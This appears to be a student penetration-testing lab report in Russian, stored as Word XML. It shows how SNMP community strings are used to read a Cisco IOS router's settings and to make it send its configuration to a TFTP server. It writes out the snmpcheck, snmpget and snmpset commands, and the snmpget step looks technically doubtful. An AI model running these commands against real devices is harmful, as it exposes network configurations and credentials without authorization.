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ДЗ 5 — Внутреннее тестирование на проникновение</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Домен задания: SNMP‑доступ к сетевому устройству.</w:t>
        <w:br/>
        <w:t>Источник задания: ДЗ 5 (восстановленное).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. Введение</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Цель работы — получить конфигурацию сетевого устройства Cisco IOS через протокол SNMP, используя найденные community‑строки: read — public, write — secret_write. Дополнительно имеется FTP/TFTP‑сервер по адресу 10.2.100.110 для выгрузки конфигурации.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. Исходные данные</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Устройство Cisco IOS — 10.2.100.10</w:t>
        <w:br/>
        <w:t>- SNMP Read‑Only community: public</w:t>
        <w:br/>
        <w:t>- SNMP Read‑Write community: secret_write</w:t>
        <w:br/>
        <w:t>- FTP/TFTP‑сервер: 10.2.100.110</w:t>
        <w:br/>
        <w:t>- Инструменты: snmpcheck, snmpset</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. Порядок действий</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Шаг 1. Проверка доступности SNMP (snmpcheck):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Команда:</w:t>
        <w:br/>
        <w:t xml:space="preserve"> snmpcheck -t 10.2.100.10 -c public</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Шаг 2. Проверка RW‑доступа:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Команда:</w:t>
        <w:br/>
        <w:t xml:space="preserve"> snmpcheck -t 10.2.100.10 -c secret_write</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Шаг 3. Чтение конфигурации через SNMP OID:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>OID конфигурации для Cisco: 1.3.6.1.4.1.9.2.1.53.0</w:t>
        <w:br/>
        <w:t>Команда:</w:t>
        <w:br/>
        <w:t xml:space="preserve"> snmpget -v2c -c public 10.2.100.10 1.3.6.1.4.1.9.2.1.53.0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Шаг 4. Передача конфигурации на TFTP:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>OID для запуска TFTP передачи:</w:t>
        <w:br/>
        <w:t>1.3.6.1.4.1.9.2.1.55.&lt;ip_address&gt;</w:t>
        <w:br/>
        <w:t>Команда:</w:t>
        <w:br/>
        <w:t xml:space="preserve"> snmpset -v2c -c secret_write 10.2.100.10 1.3.6.1.4.1.9.2.1.55.10.2.100.110 s config.cfg</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4. Результат</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>В результате выполнения команд конфигурация Cisco была выгружена на TFTP‑сервер 10.2.100.110 и может быть просмотрена в файле config.cfg.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>5. Выводы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>SNMP‑доступ с RW‑community позволяет полностью управлять устройством Cisco IOS, включая экспорт конфигурации. SNMP является критически уязвимым, если используется слабый community‑string.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